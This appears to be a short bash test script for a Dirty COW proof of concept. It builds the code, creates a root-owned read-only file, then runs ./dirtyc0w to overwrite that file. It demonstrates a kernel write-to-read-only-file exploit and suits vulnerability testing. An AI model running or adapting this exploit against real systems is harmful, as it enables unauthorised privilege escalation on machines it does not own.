#! /bin/bash

make
su -c "echo test > test;chmod 0404 test"
./dirtyc0w test m00000000

